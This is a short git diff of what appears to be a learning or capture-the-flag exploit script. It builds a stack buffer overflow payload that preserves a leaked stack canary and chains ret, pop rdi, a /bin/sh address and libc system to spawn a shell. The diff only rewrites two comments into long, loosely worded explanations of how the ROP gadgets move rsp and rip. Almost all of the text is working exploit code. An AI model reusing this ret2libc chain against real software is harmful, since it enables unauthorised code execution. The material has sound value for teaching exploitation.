@@ -39,8 +39,8 @@ system = libc_symbols.sym["system"]
 payload = b"A" * 72
 payload += p64(canary)
 payload += b"B" * 8
-payload += p64(ret)  # first you align stack
-payload += p64(pop_rdi)  # then pop rdi to make room for our argument
+payload += p64(ret)  # so when the program returns, and then when cpu executes ret, it puts rsp at the base of previous rip and puts the address in the rsp into rip and does rsp + 8and when it gets executed that is ret, rsp is at the base of pop_rdi gadget, so it loads that gadget into rip and does rsp + 8 which is at the base of binsh
+payload += p64(pop_rdi)  #now pop rdi is in the rip, which is pop rdi that is it puts current rsp into rdi which in binsh and then does rsp + 8, and at this point it rets so it puts system and it reads arguments from the calling convention from rdi and runs 
 payload += p64(binsh)  # rdi now has address for bin/sh
 payload += p64(system)  # this exeutes
 
